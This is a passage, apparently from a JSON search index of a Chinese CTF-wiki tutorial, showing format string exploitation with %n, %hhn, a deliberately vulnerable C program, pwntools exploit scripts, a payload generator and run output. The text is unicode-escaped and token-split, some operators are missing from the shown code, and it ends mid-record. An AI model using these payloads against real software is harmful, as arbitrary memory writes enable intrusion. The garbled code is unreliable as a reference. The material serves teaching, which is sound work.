\u6539\u5176\u5bf9\u5e94\u7684\u6570\u503c\u3002\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u60f3\u4e00\u4e0b\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u7684\u7c7b\u578b\n\n\n%n,\u4e0d\u8f93\u51fa\u5b57\u7b26\uff0c\u4f46\u662f\u628a\u5df2\u7ecf\u6210\u529f\u8f93\u51fa\u7684\u5b57\u7b26\u4e2a\u6570\u5199\u5165\u5bf9\u5e94\u7684\u6574\u578b\u6307\u9488\u53c2\u6570\u6240\u6307\u7684\u53d8\u91cf\u3002\n\n\n\n\n\u901a\u8fc7\u8fd9\u4e2a\u7c7b\u578b\u53c2\u6570\uff0c\u518d\u52a0\u4e0a\u4e00\u4e9b\u5c0f\u6280\u5de7\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u8fbe\u5230\u6211\u4eec\u7684\u76ee\u7684\uff0c\u8fd9\u91cc\u4ecd\u7136\u5206\u4e3a\u4e24\u90e8\u5206\uff0c\u4e00\u90e8\u5206\u4e3a\u8986\u76d6\u6808\u4e0a\u7684\u53d8\u91cf\uff0c\u7b2c\u4e8c\u90e8\u5206\u4e3a\u8986\u76d6\u6307\u5b9a\u5730\u5740\u7684\u53d8\u91cf\u3002\n\n\n\u8fd9\u91cc\u6211\u4eec\u7ed9\u51fa\u5982\u4e0b\u7684\u7a0b\u5e8f\u6765\u4ecb\u7ecd\u76f8\u5e94\u7684\u90e8\u5206\u3002\n\n\n##include \nstdio.h\n\n\nint\n \na\n \n=\n \n123\n,\n \nb\n \n=\n \n456\n;\n\n\nint\n \nmain\n()\n \n{\n\n  \nint\n \nc\n \n=\n \n789\n;\n\n  \nchar\n \ns\n[\n100\n];\n\n  \nprintf\n(\n%p\n\\n\n,\n \nc\n);\n\n  \nscanf\n(\n%s\n,\n \ns\n);\n\n  \nprintf\n(\ns\n);\n\n  \nif\n \n(\nc\n \n==\n \n16\n)\n \n{\n\n    \nputs\n(\nmodified c.\n);\n\n  \n}\n \nelse\n \nif\n \n(\na\n \n==\n \n2\n)\n \n{\n\n    \nputs\n(\nmodified a for a small number.\n);\n\n  \n}\n \nelse\n \nif\n \n(\nb\n \n==\n \n0x12345678\n)\n \n{\n\n    \nputs\n(\nmodified b for a big number!\n);\n\n  \n}\n\n  \nreturn\n \n0\n;\n\n\n}\n\n\n\n\n\nmakefile\u5728\u5bf9\u5e94\u7684\u6587\u4ef6\u5939\u4e2d\u3002\u800c\u65e0\u8bba\u662f\u8986\u76d6\u54ea\u4e2a\u5730\u5740\u7684\u53d8\u91cf\uff0c\u6211\u4eec\u57fa\u672c\u4e0a\u90fd\u662f\u6784\u9020\u7c7b\u4f3c\u5982\u4e0b\u7684payload\n\n\n...[overwrite addr]....%[overwrite offset]$n\n\n\n\n\n\u5176\u4e2d...\u8868\u793a\u6211\u4eec\u7684\u586b\u5145\u5185\u5bb9\uff0coverwrite addr \u8868\u793a\u6211\u4eec\u6240\u8981\u8986\u76d6\u7684\u5730\u5740\uff0coverwrite offset\u5730\u5740\u8868\u793a\u6211\u4eec\u6240\u8981\u8986\u76d6\u7684\u5730\u5740\u5b58\u50a8\u7684\u4f4d\u7f6e\u4e3a\u8f93\u51fa\u51fd\u6570\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u7b2c\u51e0\u4e2a\u53c2\u6570\u3002\u6240\u4ee5\u4e00\u822c\u6765\u8bf4\uff0c\u4e5f\u662f\u5982\u4e0b\u6b65\u9aa4\n\n\n\n\n\u786e\u5b9a\u8986\u76d6\u5730\u5740\n\n\n\u786e\u5b9a\u76f8\u5bf9\u504f\u79fb\n\n\n\u8fdb\u884c\u8986\u76d6\n\n\n\n\n\u8986\u76d6\u6808\u5185\u5b58\n\n\n\u786e\u5b9a\u8986\u76d6\u5730\u5740\n\n\n\u9996\u5148\uff0c\u6211\u4eec\u81ea\u7136\u662f\u6765\u60f3\u529e\u6cd5\u77e5\u9053\u6808\u53d8\u91cfc\u7684\u5730\u5740\u3002\u7531\u4e8e\u76ee\u524d\u51e0\u4e4e\u4e0a\u6240\u6709\u7684\u7a0b\u5e8f\u90fd\u5f00\u542f\u4e86aslr\u4fdd\u62a4\uff0c\u6240\u4ee5\u6808\u7684\u5730\u5740\u4e00\u76f4\u5728\u53d8\uff0c\u6240\u4ee5\u6211\u4eec\u8fd9\u91cc\u6545\u610f\u8f93\u51fa\u4e86c\u53d8\u91cf\u7684\u5730\u5740\u3002\n\n\n\u786e\u5b9a\u76f8\u5bf9\u504f\u79fb\n\n\n\u5176\u6b21\uff0c\u6211\u4eec\u6765\u786e\u5b9a\u4e00\u4e0b\u5b58\u50a8\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5730\u5740\u662fprintf\u5c06\u8981\u8f93\u51fa\u7684\u7b2c\u51e0\u4e2a\u53c2\u6570()\u3002 \u8fd9\u91cc\u6211\u4eec\u901a\u8fc7\u4e4b\u524d\u7684\u6cc4\u9732\u6808\u53d8\u91cf\u6570\u503c\u7684\u65b9\u6cd5\u6765\u8fdb\u884c\u64cd\u4f5c\u3002\u901a\u8fc7\u8c03\u8bd5\n\n\n \u2192 0xf7e44670 \nprintf+0\n       call   0xf7f1ab09 \n__x86.get_pc_thunk.ax\n\n   \u21b3  0xf7f1ab09 \n__x86.get_pc_thunk.ax+0\n mov    eax, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab0c \n__x86.get_pc_thunk.ax+3\n ret    \n      0xf7f1ab0d \n__x86.get_pc_thunk.dx+0\n mov    edx, DWORD PTR \n[\nesp\n]\n\n      0xf7f1ab10 \n__x86.get_pc_thunk.dx+3\n ret    \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n stack \n]\n\u2500\u2500\u2500\u2500\n\n[\n0xffffcd0c\n, \nl8\n]\n\n\n8\n\n0xffffcd0c\u2502+0x00: 0x080484d7  \u2192  \nmain+76\n add esp, 0x10     \u2190 \n$esp\n\n0xffffcd10\u2502+0x04: 0xffffcd28  \u2192  \n%d%d\n\n0xffffcd14\u2502+0x08: 0xffffcd8c  \u2192  0x00000315\n0xffffcd18\u2502+0x0c: 0x000000c2\n0xffffcd1c\u2502+0x10: 0xf7e8b6bb  \u2192  \nhandle_intel+107\n add esp, 0x10\n0xffffcd20\u2502+0x14: 0xffffcd4e  \u2192  0xffff0000  \u2192  0x00000000\n0xffffcd24\u2502+0x18: 0xffffce4c  \u2192  0xffffd07a  \u2192  \nXDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]\n\n0xffffcd28\u2502+0x1c: \n%d%d\n     \u2190 \n$eax\n\n\n\n\n\n\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u57280xffffcd28\u5904\u5b58\u50a8\u7740\u53d8\u91cfc\u7684\u6570\u503c\u3002\u7ee7\u800c\uff0c\u6211\u4eec\u518d\u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32'%d%d'\u7684\u5730\u57400xffffcd28\u76f8\u5bf9\u4e8eprintf\u51fd\u6570\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u65700xffffcd10\u7684\u504f\u79fb\u4e3a0x18\uff0c\u5373\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f8\u5f53\u4e8eprintf\u51fd\u6570\u7684\u7b2c7\u4e2a\u53c2\u6570\uff0c\u76f8\u5f53\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u7b2c6\u4e2a\u53c2\u6570\u3002\n\n\n\u8fdb\u884c\u8986\u76d6\n\n\n\u8fd9\u6837\uff0c\u7b2c6\u4e2a\u53c2\u6570\u5904\u7684\u503c\u5c31\u662f\u5b58\u50a8\u53d8\u91cfc\u7684\u5730\u5740\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u5229\u7528%n\u7684\u7279\u5f81\u6765\u4fee\u6539c\u7684\u503c\u3002payload\u5982\u4e0b\n\n\n[addr of c]%012d%6$n\n\n\n\n\naddr of c \u7684\u957f\u5ea6\u4e3a4\uff0c\u6545\u800c\u6211\u4eec\u5f97\u518d\u8f93\u516512\u4e2a\u5b57\u7b26\u624d\u53ef\u4ee5\u8fbe\u523016\u4e2a\u5b57\u7b26\uff0c\u4ee5\u4fbf\u4e8e\u6765\u4fee\u6539c\u7684\u503c\u4e3a16\u3002\n\n\n\u5177\u4f53\u811a\u672c\u5982\u4e0b\n\n\ndef\n \nforc\n():\n\n    \nsh\n \n=\n \nprocess\n(\n./overwrite\n)\n\n    \nc_addr\n \n=\n \nint\n(\nsh\n.\nrecvuntil\n(\n\\n\n,\n \ndrop\n=\nTrue\n),\n \n16\n)\n\n    \nprint\n \nhex\n(\nc_addr\n)\n\n    \npayload\n \n=\n \np32\n(\nc_addr\n)\n \n+\n \n%012d\n \n+\n \n%6$n\n\n    \nprint\n \npayload\n\n    \n#gdb.attach(sh)\n\n    \nsh\n.\nsendline\n(\npayload\n)\n\n    \nprint\n \nsh\n.\nrecv\n()\n\n    \nsh\n.\ninteractive\n()\n\n\n\nforc\n()\n\n\n\n\n\n\u7ed3\u679c\u5982\u4e0b\n\n\n\u279c  overwrite git:\n(\nmaster\n)\n \u2717 python exploit.py\n\n[\n+\n]\n Starting \nlocal\n process \n./overwrite\n: pid \n74806\n\n0xfffd8cdc\n\u070c\ufffd\ufffd%012d%6\n$n\n\n\u070c\ufffd\ufffd-00000160648modified c.\n\n\n\n\n\u8986\u76d6\u4efb\u610f\u5730\u5740\u5185\u5b58\n\n\n\u8986\u76d6\u5c0f\u6570\u5b57\n\n\n\u9996\u5148\uff0c\u6211\u4eec\u6765\u8003\u8651\u4e00\u4e0b\u5982\u4f55\u4fee\u6539data\u6bb5\u7684\u53d8\u91cf\u4e3a\u4e00\u4e2a\u8f83\u5c0f\u7684\u6570\u5b57\uff0c\u6bd4\u5982\u8bf4\uff0c\n\u5c0f\u4e8e\u673a\u5668\u5b57\u957f\u7684\u6570\u5b57\n\u3002\u8fd9\u91cc\u4ee52\u4e3a\u4f8b\u3002\u53ef\u80fd\u4f1a\u89c9\u5f97\u8fd9\u5176\u5b9e\u6ca1\u6709\u4ec0\u4e48\u533a\u522b\uff0c\u53ef\u4ed4\u7ec6\u4e00\u60f3\uff0c\u771f\u7684\u6ca1\u6709\u4e48\uff1f\u5982\u679c\u6211\u4eec\u8fd8\u662f\u5c06\u8981\u8986\u76d6\u7684\u5730\u5740\u653e\u5728\u6700\u524d\u9762\uff0c\u90a3\u4e48\u5c06\u76f4\u63a5\u5360\u7528\u673a\u5668\u5b57\u957f\u4e2a(4\u62168)\u5b57\u8282\u3002\u663e\u7136\uff0c\u65e0\u8bba\u4e4b\u540e\u5982\u4f55\u8f93\u51fa\uff0c\u90fd\u53ea\u4f1a\u6bd44\u5927\u3002\n\n\n\n\n\u83b7\u53d6\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u6574\u5f62\u6ea2\u51fa\u6765\u4fee\u6539\u5bf9\u5e94\u7684\u5730\u5740\u7684\u503c\uff0c\u4f46\u662f\u8fd9\u6837\u5c06\u9762\u4e34\u7740\u6211\u4eec\u5f97\u4e00\u6b21\u8f93\u51fa\u5927\u91cf\u7684\u5185\u5bb9\u3002\u800c\u8fd9\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u57fa\u672c\u90fd\u4e0d\u4f1a\u653b\u51fb\u6210\u529f\u3002\n\n\n\n\n\u90a3\u4e48\u6211\u4eec\u5e94\u8be5\u600e\u4e48\u505a\u5462\uff1f\u518d\u4ed4\u7ec6\u60f3\u4e00\u4e0b\uff0c\u6211\u4eec\u6709\u5fc5\u8981\u5c06\u6240\u8981\u8986\u76d6\u7684\u53d8\u91cf\u7684\u5730\u5740\u653e\u5728\u5b57\u7b26\u4e32\u7684\u6700\u524d\u9762\u4e48\uff1f\u4f3c\u4e4e\u6ca1\u6709\uff0c\u6211\u4eec\u5f53\u65f6\u53ea\u662f\u4e3a\u4e86\u5bfb\u627e\u504f\u79fb\uff0c\u6240\u4ee5\u624d\u628atag\u653e\u5728\u5b57\u7b26\u4e32\u7684\u6700\u524d\u9762\uff0c\u5982\u679c\u6211\u4eec\u628atag\u653e\u5728\u4e2d\u95f4\uff0c\u5176\u5b9e\u4e5f\u662f\u65e0\u59a8\u7684\u3002\u7c7b\u4f3c\u7684\uff0c\u6211\u4eec\u628a\u5730\u5740\u653e\u5728\u4e2d\u95f4\uff0c\u53ea\u8981\u80fd\u591f\u627e\u5230\u5bf9\u5e94\u7684\u504f\u79fb\uff0c\u5176\u7167\u6837\u4e5f\u53ef\u4ee5\u5f97\u5230\u5bf9\u5e94\u7684\u6570\u503c\u3002\u524d\u9762\u5df2\u7ecf\u8bf4\u4e86\u6211\u4eec\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u4e3a\u7b2c6\u4e2a\u53c2\u6570\u3002\u7531\u4e8e\u6211\u4eec\u60f3\u8981\u628a2\u5199\u5230\u5bf9\u5e94\u7684\u5730\u5740\u5904\uff0c\u6545\u800c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u524d\u9762\u7684\u5b57\u8282\u5fc5\u987b\u662f\n\n\naa%k$n\n\n\n\n\n\u6b64\u65f6\u5bf9\u5e94\u7684\u5b58\u50a8\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5df2\u7ecf\u5360\u636e\u4e866\u4e2a\u5b57\u7b26\u7684\u4f4d\u7f6e\uff0c\u5982\u679c\u6211\u4eec\u518d\u6dfb\u52a0\u4e24\u4e2a\u5b57\u7b26aa\uff0c\u90a3\u4e48\u5176\u5b9eaa%k\u5c31\u662f\u7b2c6\u4e2a\u53c2\u6570\uff0c$naa\u5176\u5b9e\u5c31\u662f\u7b2c7\u4e2a\u53c2\u6570\uff0c\u540e\u9762\u6211\u4eec\u5982\u679c\u8ddf\u4e0a\u6211\u4eec\u8981\u8986\u76d6\u7684\u5730\u5740\uff0c\u90a3\u5c31\u662f\u7b2c8\u4e2a\u53c2\u6570\uff0c\u6240\u4ee5\u5982\u679c\u6211\u4eec\u8fd9\u91cc\u8bbe\u7f6ek\u4e3a8\uff0c\u5176\u5b9e\u5c31\u53ef\u4ee5\u8986\u76d6\u4e86\u3002\n\n\n\u5229\u7528ida\u53ef\u4ee5\u5f97\u5230a\u7684\u5730\u5740\u4e3a0x0804A024\n\n\n.data:\n0804\nA024\n                 \npublic\n \na\n\n\n.data:\n0804\nA024\n \na\n               \ndd\n \n7\nBh\n  \n\n\n\n\n\u6545\u800c\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u5982\u4e0b\u7684\u5229\u7528\u4ee3\u7801\n\n\ndef\n \nfora\n():\n\n    \nsh\n \n=\n \nprocess\n(\n./overwrite\n)\n\n    \na_addr\n \n=\n \n0x0804A024\n\n    \npayload\n \n=\n \naa%8$naa\n \n+\n \np32\n(\na_addr\n)\n\n    \nsh\n.\nsendline\n(\npayload\n)\n\n    \nprint\n \nsh\n.\nrecv\n()\n\n    \nsh\n.\ninteractive\n()\n\n\n\n\n\n\u5bf9\u5e94\u7684\u7ed3\u679c\u5982\u4e0b\n\n\n\u279c  overwrite git:\n(\nmaster\n)\n \u2717 python exploit.py\n\n[\n+\n]\n Starting \nlocal\n process \n./overwrite\n: pid \n76508\n\n\n[\n*\n]\n Process \n./overwrite\n stopped with \nexit\n code \n0\n \n(\npid \n76508\n)\n\n0xffc1729c\naaaa$\n\\x\na0\n\\x\n0modified a \nfor\n a small number.\n\n\n\n\n\u5176\u5b9e\uff0c\u8fd9\u91cc\u6211\u4eec\u9700\u8981\u638c\u63e1\u7684\u5c0f\u6280\u5de7\u5c31\u662f\uff0c\u6211\u4eec\u6ca1\u6709\u5fc5\u8981\u5fc5\u987b\u628a\u5730\u5740\u653e\u5728\u6700\u524d\u9762\uff0c\u653e\u5728\u90a3\u91cc\u90fd\u53ef\u4ee5\uff0c\u53ea\u8981\u6211\u4eec\u53ef\u4ee5\u627e\u5230\u5176\u5bf9\u5e94\u7684\u504f\u79fb\u5373\u53ef\u3002\n\n\n\u8986\u76d6\u5927\u6570\u5b57\n\n\n\u4e0a\u9762\u4ecb\u7ecd\u4e86\u8986\u76d6\u5c0f\u6570\u5b57\uff0c\u8fd9\u91cc\u6211\u4eec\u5c31\u5c11\u8986\u76d6\u5927\u6570\u5b57\u4e86\u3002\u4e0a\u9762\u6211\u4eec\u4e5f\u8bf4\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u76f4\u63a5\u4e00\u6b21\u6027\u8f93\u51fa\u5927\u6570\u5b57\u4e2a\u5b57\u8282\u6765\u8fdb\u884c\u8986\u76d6\uff0c\u4f46\u662f\u8fd9\u6837\u57fa\u672c\u4e5f\u4e0d\u4f1a\u6210\u529f\uff0c\u56e0\u4e3a\u592a\u957f\u4e86\u3002\u800c\u4e14\u5373\u4f7f\u6210\u529f\uff0c\u6211\u4eec\u4e00\u6b21\u6027\u7b49\u5f85\u7684\u65f6\u95f4\u4e5f\u592a\u957f\u4e86\uff0c\u90a3\u4e48\u6709\u6ca1\u6709\u4ec0\u4e48\u6bd4\u8f83\u597d\u7684\u65b9\u5f0f\u5462\uff1f\u81ea\u7136\u662f\u6709\u4e86\u3002\n\n\n\u4e0d\u8fc7\u5728\u4ecb\u7ecd\u4e4b\u524d\uff0c\u6211\u4eec\u5f97\u5148\u518d\u7b80\u5355\u4e86\u89e3\u4e00\u4e0b\uff0c\u53d8\u91cf\u5728\u5185\u5b58\u4e2d\u7684\u5b58\u50a8\u683c\u5f0f\u3002\u9996\u5148\uff0c\u6240\u6709\u7684\u53d8\u91cf\u5728\u5185\u5b58\u4e2d\u90fd\u662f\u4ee5\u5b57\u8282\u8fdb\u884c\u5b58\u50a8\u7684\u3002\u6b64\u5916\uff0c\u53d8\u91cf\u4e00\u822c\u7684\u5b58\u50a8\u683c\u5f0f\u4e3a\u4ee5\u5c0f\u7aef\u5b58\u50a8\uff0c\u5373\u6700\u4f4e\u6709\u6548\u4f4d\u5b58\u50a8\u5728\u4f4e\u5730\u5740\u3002\u4e3e\u4e2a\u4f8b\u5b50\uff0c0x12345678\u5728\u5185\u5b58\u4e2d\u7531\u4f4e\u5730\u5740\u5230\u9ad8\u5730\u5740\u4f9d\u6b21\u4e3a\\x78\\x56\\x34\\x12\u3002\u518d\u8005\uff0c\u6211\u4eec\u53ef\u4ee5\u56de\u5fc6\u4e00\u4e0b\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u91cc\u9762\u7684\u6807\u5fd7\uff0c\u53ef\u4ee5\u53d1\u73b0\u6709\u8fd9\u4e48\u4e24\u4e2a\u6807\u5fd7\n\n\nhh \u5bf9\u4e8e\u6574\u6570\u7c7b\u578b\uff0cprintf\u671f\u5f85\u4e00\u4e2a\u4ecechar\u63d0\u5347\u7684int\u5c3a\u5bf8\u7684\u6574\u578b\u53c2\u6570\u3002\nh  \u5bf9\u4e8e\u6574\u6570\u7c7b\u578b\uff0cprintf\u671f\u5f85\u4e00\u4e2a\u4eceshort\u63d0\u5347\u7684int\u5c3a\u5bf8\u7684\u6574\u578b\u53c2\u6570\u3002\n\n\n\n\n\u6240\u4ee5\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528%hhn\u5411\u67d0\u4e2a\u5730\u5740\u5199\u5165\u5355\u5b57\u8282\uff0c\u5229\u7528%hn\u5411\u67d0\u4e2a\u5730\u5740\u5199\u5165\u53cc\u5b57\u8282\u3002\u8fd9\u91cc\uff0c\u6211\u4eec\u4ee5\u5355\u5b57\u8282\u4e3a\u4f8b\u3002\n\n\n\u9996\u5148\uff0c\u6211\u4eec\u8fd8\u662f\u8981\u786e\u5b9a\u7684\u662f\u8981\u8986\u76d6\u7684\u5730\u5740\u4e3a\u591a\u5c11\uff0c\u5229\u7528ida\u770b\u4e00\u4e0b\uff0c\u53ef\u4ee5\u53d1\u73b0\u5730\u5740\u4e3a0x0804A028\u3002\n\n\n.data:0804A028                 public b\n.data:0804A028 b               dd 1C8h                 ; DATA XREF: main:loc_8048510\u0018r\n\n\n\n\n\u5373\u6211\u4eec\u5e0c\u671b\u5c06\u6309\u7167\u5982\u4e0b\u65b9\u5f0f\u8fdb\u884c\u8986\u76d6\uff0c\u524d\u9762\u4e3a\u8986\u76d6\u5730\u5740\uff0c\u540e\u9762\u4e3a\u8986\u76d6\u5185\u5bb9\u3002\n\n\n0x0804A028 \\x78\n0x0804A029 \\x56\n0x0804A02a \\x34\n0x0804A02b \\x12\n\n\n\n\n\u9996\u5148\uff0c\u7531\u4e8e\u6211\u4eec\u7684\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a6\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u6211\u4eec\u7684payload\u57fa\u672c\u662f\u8fd9\u4e2a\u6837\u5b50\u7684\n\n\np32(0x0804A028)+p32(0x0804A029)+p32(0x0804A02a)+p32(0x0804A02b)+pad1+\n%6$n\n+pad2+\n%7$n\n+pad3+\n%8$n\n+pad4+\n%9$n\n\n\n\n\n\n\u6211\u4eec\u53ef\u4ee5\u4f9d\u6b21\u8fdb\u884c\u8ba1\u7b97\u3002\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u57fa\u672c\u7684\u6784\u9020\uff0c\u5982\u4e0b\n\n\ndef\n \nfmt\n(\nprev\n,\n \nword\n,\n \nindex\n):\n\n    \nif\n \nprev\n \n \nword\n:\n\n        \nresult\n \n=\n \nword\n \n-\n \nprev\n\n        \nfmtstr\n \n=\n \n%\n \n+\n \nstr\n(\nresult\n)\n \n+\n \nc\n\n    \nelif\n \nprev\n \n==\n \nword\n:\n\n        \nresult\n \n=\n \n0\n\n    \nelse\n:\n\n        \nresult\n \n=\n \n256\n \n+\n \nword\n \n-\n \nprev\n\n        \nfmtstr\n \n=\n \n%\n \n+\n \nstr\n(\nresult\n)\n \n+\n \nc\n\n    \nfmtstr\n \n+=\n \n%\n \n+\n \nstr\n(\nindex\n)\n \n+\n \n$hhn\n\n    \nreturn\n \nfmtstr\n\n\n\n\ndef\n \nfmt_str\n(\noffset\n,\n \nsize\n,\n \naddr\n,\n \ntarget\n):\n\n    \npayload\n \n=\n \n\n    \nfor\n \ni\n \nin\n \nrange\n(\n4\n):\n\n        \nif\n \nsize\n \n==\n \n4\n:\n\n            \npayload\n \n+=\n \np32\n(\naddr\n \n+\n \ni\n)\n\n        \nelse\n:\n\n            \npayload\n \n+=\n \np64\n(\naddr\n \n+\n \ni\n)\n\n    \nprev\n \n=\n \nlen\n(\npayload\n)\n\n    \nfor\n \ni\n \nin\n \nrange\n(\n4\n):\n\n        \npayload\n \n+=\n \nfmt\n(\nprev\n,\n \n(\ntarget\n \n \ni\n \n*\n \n8\n)\n \n \n0xff\n,\n \noffset\n \n+\n \ni\n)\n\n        \nprev\n \n=\n \n(\ntarget\n \n \ni\n \n*\n \n8\n)\n \n \n0xff\n\n    \nreturn\n \npayload\n\n\npayload\n \n=\n \nfmt_str\n(\n6\n,\n4\n,\n0x0804A028\n,\n0x12345678\n)\n\n\n\n\n\n\u5176\u4e2d\u6bcf\u4e2a\u53c2\u6570\u7684\u542b\u4e49\u57fa\u672c\u5982\u4e0b\n\n\n\n\noffset\u8868\u793a\u8981\u8986\u76d6\u7684\u5730\u5740\u6700\u521d\u7684\u504f\u79fb\n\n\nsize\u8868\u793a\u673a\u5668\u5b57\u957f\n\n\naddr\u8868\u793a\u5c06\u8981\u8986\u76d6\u7684\u5730\u5740\u3002\n\n\ntarget\u8868\u793a\u6211\u4eec\u8981\u8986\u76d6\u4e3a\u7684\u76ee\u7684\u53d8\u91cf\u503c\u3002\n\n\n\n\n\u76f8\u5e94\u7684exploit\u5982\u4e0b\n\n\ndef\n \nforb\n():\n\n    \nsh\n \n=\n \nprocess\n(\n./overwrite\n)\n\n    \npayload\n \n=\n \nfmt_str\n(\n6\n,\n \n4\n,\n \n0x0804A028\n,\n \n0x12345678\n)\n\n    \nprint\n \npayload\n\n    \nsh\n.\nsendline\n(\npayload\n)\n\n    \nprint\n \nsh\n.\nrecv\n()\n\n    \nsh\n.\ninteractive\n()\n\n\n\n\n\n\u7ed3\u679c\u5982\u4e0b\n\n\n\u279c\n  \noverwrite\n \ngit\n:(\nmaster\n)\n \n\u2717\n \npython\n \nexploit\n.\npy\n\n\n[\n+\n]\n \nStarting\n \nlocal\n \nprocess\n \n./overwrite\n:\n \npid\n \n78547\n\n\n(\n\\\nxa0\n\\\nx0\n)\n\\\nxa0\n\\\nx0\n*\n\\\nxa0\n\\\nx0\n+\n\\\nxa0\n\\\nx0\n%\n104\nc\n%\n6\n$\nhhn\n%\n222\nc\n%\n7\n$\nhhn\n%\n222\nc\n%\n8\n$\nhhn\n%\n222\nc\n%\n9\n$\nhhn\n\n\n[\n*\n]\n \nProcess\n \n./overwrite\n \nstopped\n \nwith\n \nexit\n \ncode\n \n0\n \n(\npid\n \n78547\n)\n\n\n0xfff6f9bc\n\n\n(\n\\\nxa0\n\\\nx0\n)\n\\\nxa0\n\\\nx0\n*\n\\\nxa0\n\\\nx0\n+\n\\\nxa0\n\\\nx0\n                                                                                                       \nX\n                                                                                                                                                                                                                             \n\ufffd\n                                                                                                                                                                                                                             \\\nxbb\n                                                                                                                                                                                                                             \n~\nmodified\n \nb\n \nfor\n \na\n \nbig\n \nnumber\n!\n\n\n\n\n\n\u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u5229\u7528%n\u5206\u522b\u5bf9\u6bcf\u4e2a\u5730\u5740\u8fdb\u884c\u5199\u5165\uff0c\u4e5f\u53ef\u4ee5\u5f97\u5230\u5bf9\u5e94\u7684\u7b54\u6848\uff0c\u4f46\u662f\u7531\u4e8e\u6211\u4eec\u5199\u5165\u7684\u53d8\u91cf\u90fd\u53ea\u4f1a\u5f71\u54cd\u7531\u5176\u5f00\u59cb\u7684\u56db\u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u6700\u540e\u4e00\u4e2a\u53d8\u91cf\u5199\u5b8c\u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u4fee\u6539\u4e4b\u540e\u7684\u4e09\u4e2a\u5b57\u8282\uff0c\u5982\u679c\u8fd9\u4e09\u4e2a\u5b57\u8282\u6bd4\u8f83\u91cd\u8981\u7684\u8bdd\uff0c\u7a0b\u5e8f\u5c31\u6709\u53ef\u80fd\u56e0\u6b64\u5d29\u6e83\u3002\u800c\u91c7\u7528%hhn\u5219\u4e0d\u4f1a\u6709\u8fd9\u6837\u7684\u95ee\u9898\uff0c\u56e0\u4e3a\u8fd9\u6837\u53ea\u4f1a\u4fee\u6539\u76f8\u5e94\u5730\u5740\u7684\u4e00\u4e2a\u5b57\u8282\u3002", 
            "title": "\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_exploit/#_1", 
            "text": "\u5176\u5b9e\uff0c\u5728\u4e0a\u4e00\u90e8\u5206\uff0c\u6211\u4eec\u5c55\u793a\u4e86\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\u4e24\u4e2a\u5229\u7528\u624b\u6bb5   \u4f7f\u7a0b\u5e8f\u5d29\u6e83\uff0c\u56e0\u4e3a%s\u5bf9\u5e94\u7684\u53c2\u6570\u5730\u5740\u4e0d\u5408\u6cd5\u7684\u6982\u7387\u6bd4\u8f83\u5927\u3002  \u67e5\u770b\u8fdb\u7a0b\u5185\u5bb9\uff0c\u6839\u636e%d\uff0c%f\u8f93\u51fa\u4e86\u6808\u4e0a\u7684\u5185\u5bb9\u3002   \u4e0b\u9762\u6211\u4eec\u4f1a\u5bf9\u4e8e\u6bcf\u4e00\u65b9\u9762\u8fdb\u884c\u66f4\u52a0\u8be6\u7ec6\u7684\u89e3\u91ca\u3002", 
            "title": "\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_exploit/#_2", 
